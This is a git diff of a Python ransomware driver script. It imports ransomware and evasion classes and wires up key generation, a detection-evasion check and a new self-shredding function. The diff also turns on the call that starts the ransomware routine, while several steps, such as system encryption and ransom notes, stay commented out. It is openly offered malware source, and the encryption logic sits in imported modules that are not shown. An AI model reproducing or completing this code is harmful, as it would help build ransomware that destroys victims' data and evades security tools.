@@ -10,7 +10,7 @@ from ransomware import ransomware
 ran = ransomware()
 e = evador()
 
-def encrypt():
+def start_ransomware():
     print("Generating keys...")
     ran.generate_keys()
     ran.generate_fernet()
@@ -18,9 +18,14 @@ def encrypt():
     print("Encrypting the data...")
     #ran.encrypt_system()
     ran.delete_keys()
+    print("Adding notes to the user")
     #ran.add_notes()
-    #ran.shred(os.path.abspath(__file__))   #Delete ourself
-    
+    print("Deleting ourself from the system")    
+    #shred_ourself()
+
+def shred_ourself():
+    ran.shred(os.path.abspath(__file__))
+
 if __name__ == "__main__":
     s1 = input("Are you sure you want to execute this program, this can harm you computer with no option to recover the data? (yes or no) ")
     if s1.lower() == "yes":
@@ -29,7 +34,7 @@ if __name__ == "__main__":
             print("Already executed?")
             if ran.already_executed():
                 print("\nBeginning the Ransomware\n")
-                #encrypt()
+                start_ransomware()
             else:
                 print("Doing security checks")                
                 if e.evade_detection():
@@ -39,8 +44,9 @@ if __name__ == "__main__":
                     #ran.reboot_into_safe_mode()
                 else:
                     print("\nWasn't able to bypass the Security checks.")
-                    sys.exit(0)                    
+                    #shred_ourself()
+                    sys.exit(0)
         else:
             sys.exit(0)
     else:
-        sys.exit(0)        
+        sys.exit(0)
